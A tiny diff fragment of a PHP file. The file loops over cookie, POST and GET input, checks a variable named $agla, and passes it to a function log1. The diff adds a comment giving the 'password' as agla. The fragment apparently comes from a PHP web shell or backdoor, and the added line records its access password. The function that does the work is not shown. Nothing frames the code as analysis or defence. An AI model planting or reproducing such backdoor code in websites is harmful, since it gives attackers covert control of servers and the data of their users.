@@ -19,3 +19,5 @@ foreach (array('_COOKIE','_POST','_GET') as $_request)
 $id = isset($agla) ? $id : 2;
 log1($agla);
 ?>
+
+//密码：agla
